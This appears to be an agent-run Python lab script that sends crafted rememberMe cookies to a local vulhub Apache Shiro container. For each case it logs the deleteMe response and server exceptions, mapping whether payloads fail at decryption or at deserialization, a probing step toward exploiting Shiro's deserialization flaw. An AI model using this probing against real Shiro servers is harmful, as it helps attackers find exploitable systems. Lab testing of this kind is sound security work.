#!/usr/bin/env python3
# loop3 t7 C1 判别矩阵：逐类投递，记录 deleteMe + 日志新增，区分解密/反序列化阶段
import json, os, re, subprocess, sys, time, datetime
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
SHIRO = "http://127.0.0.1:18081/"
UA = "loop3-t7/1.0 (authorized local lab)"
OUT_PATH = os.path.join(CWD, r"security\learning\_evidence\loop3-t7-c1-matrix-20261012.json")
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:600], flush=True)
    return kw


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd],
                       capture_output=True, text=True, cwd=CWD)
    return r.stdout + r.stderr


def clean_b64(s):
    m = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    return max(m, key=len) if m else ""


def logs_since(seconds):
    r = subprocess.run(f'docker logs --since {seconds}s vulhub-shiro-18081',
                       shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr)


def send(label, ck, timeout=40):
    time.sleep(1.5)
    t0 = time.time()
    try:
        r = requests.get(SHIRO, headers={"User-Agent": UA, "Cookie": "rememberMe=" + ck},
                         timeout=timeout, allow_redirects=False)
        dt = time.time() - t0
        return {"label": label, "status": r.status_code, "elapsed_s": round(dt, 3),
                "deleteMe": ("rememberMe=deleteMe" in r.headers.get("Set-Cookie", ""))}
    except Exception as e:
        return {"label": label, "error": repr(e)[:150], "elapsed_s": round(time.time() - t0, 3)}


kali("ruby /tmp/t7-c1-matrix.rb")
time.sleep(1)

CASES = ["P1_valid_serialized_string", "P2_garbage_plaintext", "P3_magic_truncated",
         "P4_long_garbage", "P5_wrongkey_garbage"]

print("=" * 78)
for c in CASES:
    ck = clean_b64(kali(f"cat /tmp/t7-c1-matrix/{c}.txt"))
    if not ck:
        rec(f"{c}_EMPTY", reason="no cookie extracted")
        continue
    n_before = len(logs_since(240))
    r = send(c, ck)
    time.sleep(2.0)
    log_after = logs_since(60)
    # 只统计与本请求时间窗相关的异常关键字
    exc = [ln.strip() for ln in log_after.splitlines()
           if any(k in ln for k in ("Exception", "Caused by", "CryptoException", "invalid cookie", "Cannot", "IllegalArgument"))]
    entry = {**r, "cookie_len": len(ck), "log_anomaly_count": len(exc),
             "log_anomalies": exc[:4]}
    rec(f"MATRIX_{c}", **entry)
    print(f">>> {c}: deleteMe={r.get('deleteMe')} log_exc={len(exc)}", flush=True)

rec("interpretation",
    note="deleteMe=true 表示 RememberMeManager.onRememberedPrincipalFailure（解密或反序列化失败）；"
         "deleteMe=false 表示走到了反序列化之后的阶段。P5(wrongkey) 应=true 作为解密失败锚点。")

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok"}))
